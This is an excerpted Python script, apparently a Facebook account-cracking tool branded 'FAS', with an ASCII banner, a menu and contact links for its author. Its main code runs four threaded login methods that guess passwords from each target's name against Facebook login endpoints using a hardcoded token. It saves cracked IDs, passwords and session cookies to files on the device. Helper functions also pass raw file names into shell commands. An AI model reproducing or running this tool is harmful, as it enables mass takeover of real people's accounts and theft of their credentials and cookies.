#!/usr/bin/python
#BARKI Teach my wp +8801871528249
...
from concurrent.futures import ThreadPoolExecutor as FIROZFAS
from string import * 
...
sys.stdout.write('\x1b]2; FAS\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
FFFFFFFFFFFFFFFFFFFFFFIIIIIIIIIIRRRRRRRRRRRRRRRRR        OOOOOOOOO     ZZZZZZZZZZZZZZZZZZZ
F::::::::::::::::::::FI::::::::IR::::::::::::::::R     OO:::::::::OO   Z:::::::::::::::::Z
F::::::::::::::::::::FI::::::::IR::::::RRRRRR:::::R  OO:::::::::::::OO Z:::::::::::::::::Z
FF::::::FFFFFFFFF::::FII::::::IIRR:::::R     R:::::RO:::::::OOO:::::::OZ:::ZZZZZZZZ:::::Z 
  F:::::F       FFFFFF  I::::I    R::::R     R:::::RO::::::O   O::::::OZZZZZ     Z:::::Z  
  F:::::F               I::::I    R::::R     R:::::RO:::::O     O:::::O        Z:::::Z    
  F::::::FFFFFFFFFF     I::::I    R::::RRRRRR:::::R O:::::O     O:::::O       Z:::::Z     
  F:::::::::::::::F     I::::I    R:::::::::::::RR  O:::::O     O:::::O      Z:::::Z      
  F:::::::::::::::F     I::::I    R::::RRRRRR:::::R O:::::O     O:::::O     Z:::::Z       
  F::::::FFFFFFFFFF     I::::I    R::::R     R:::::RO:::::O     O:::::O    Z:::::Z        
  F:::::F               I::::I    R::::R     R:::::RO:::::O     O:::::O   Z:::::Z         
  F:::::F               I::::I    R::::R     R:::::RO::::::O   O::::::OZZZ:::::Z     ZZZZZ
FF:::::::FF           II::::::IIRR:::::R     R:::::RO:::::::OOO:::::::OZ::::::ZZZZZZZZ:::Z
F::::::::FF           I::::::::IR::::::R     R:::::R OO:::::::::::::OO Z:::::::::::::::::Z
F::::::::FF           I::::::::IR::::::R     R:::::R   OO:::::::::OO   Z:::::::::::::::::Z
FFFFFFFFFFF           IIIIIIIIIIRRRRRRRR     RRRRRRR     OOOOOOOOO     ZZZZZZZZZZZZZZZZZZZ
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back FAS Menu ")
        exit()
...
def FIROZ():   
    ...
    print(f'[W] Contact with admin ')
    print(f'[F] Admins Facebook ')
    print('')
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://chat.whatsapp.com/'+8801871528249)
        pass
    elif select =='F':
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[FAS] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    oks.append(sid)
                    open('/sdcard/FAS_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/FAS_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [FAS-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/FAS_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[FAS] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [FAS-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/FAS_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/FAS_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [FAS-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[FAS] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[FAS] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [FAS-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/FAS_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with FIROZFAS(max_workers=30) as FASworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                FASworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                FASworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                FASworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                FASworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/FAS.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/FAS.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    FAS = input('Put File Name :')
    print(" ")
    FIROZ = input('Saving Put File Name :')
    os.system('touch ' +FIROZ)
    os.system('sort -r '+FAS+' | uniq > '+FIROZ)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + FAS )
    print(47*'-')
    print("File Saved To :" + FIROZ )
    print(47*'-')
    input(f"{S} Press Enter To Back FAS Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/FAS.txt\n') 
        filepath = input("Put File Name: ")
